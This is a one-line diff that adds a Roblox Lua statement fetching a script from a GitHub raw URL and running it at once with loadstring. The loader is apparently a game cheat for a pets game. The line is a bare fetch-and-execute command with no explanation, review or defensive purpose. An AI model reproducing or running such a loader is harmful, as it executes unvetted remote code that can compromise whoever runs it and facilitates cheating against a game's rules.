@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/upd-pets-universe-spam1-y93kcv31mcy4c6.lua"))()
